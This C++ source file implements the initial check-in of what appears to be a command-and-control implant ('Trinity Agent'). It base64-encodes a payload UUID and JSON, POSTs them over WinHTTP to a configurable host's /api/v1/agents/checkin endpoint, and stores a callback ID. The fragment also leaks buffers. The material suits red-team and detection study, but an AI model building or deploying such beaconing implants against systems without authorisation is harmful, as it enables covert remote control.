#include "CommManager.h"
#include "base64.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#ifndef PAYLOAD_UUID
	#define PAYLOAD_UUID "default"
#endif

#ifndef HOST
	#define HOST "127.0.0.1"
#endif


CommManager::CommManager(const std::string& empUUID, const std::string& empHost)
{
	uuid = empUUID.empty() ? PAYLOAD_UUID : empUUID;
	host = empHost.empty() ? HOST : empHost;
}

std::string CommManager::IntialCheckin(const std::string& json)
{
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
	BOOL bResults = FALSE;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer = NULL;
	std::string result;

	hSession = WinHttpOpen(
		L"Trinity Agent Client/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession)
	{
		std::wstring wideHost(host.begin(), host.end());
		hConnect = WinHttpConnect(hSession, wideHost.c_str(), 5069, 0);
	}

	if (hConnect)
	{
		hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	}

	LPCWSTR pwszHeaders = L"Content-Type: application/json\r\n";
	std::string strData = base64::to_base64(uuid + json);
	LPVOID lpOptional = (LPVOID)strData.c_str();
	DWORD dwOptionalLength = (DWORD)strData.length();

	if (hRequest)
	{
		bResults = WinHttpSendRequest(
			hRequest,
			pwszHeaders,
			(DWORD)-1L,
			(LPVOID)strData.c_str(),
			(DWORD)strData.length(),
			(DWORD)strData.length(),
			0);
	}

	if (bResults)
	{
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	}
	if (bResults)
	{
		do {
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				std::cerr << "[x] Error " << GetLastError() << " in WinHttpQueryDataAvaliable.\n";
			}
			// No Tasks have been issued
			if (dwSize == 0) break;

			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				std::cerr << "[x] Could not allocate buffer. \n";
				break;
			}

			ZeroMemory(pszOutBuffer, dwSize + 1);
			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
			{
				std::cerr << "[x] Error " << GetLastError() << " in WinHttpReadData.\n";
			}
			else
			{
				std::cout << pszOutBuffer;
			}
			
		} while (dwSize > 0);

		result = std::string(pszOutBuffer);
		callbackUUID = base64::from_base64(result);
		delete[] pszOutBuffer;
	}
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return result;
}
